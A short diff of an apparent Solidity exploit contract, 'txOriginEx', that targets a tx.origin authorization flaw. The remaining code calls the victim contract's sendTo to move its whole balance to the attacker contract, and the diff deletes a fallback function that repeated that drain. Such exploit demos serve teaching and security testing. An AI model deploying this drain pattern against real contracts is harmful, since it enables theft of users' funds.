@@ -15,9 +15,5 @@ contract txOriginEx {
         vuln.sendTo(payable(address(this)), address(vuln).balance);
     }
     
-    fallback() external payable {
-        vuln.sendTo(payable(address(this)), address(vuln).balance);
-    }
-    
     receive() external payable{}
 }
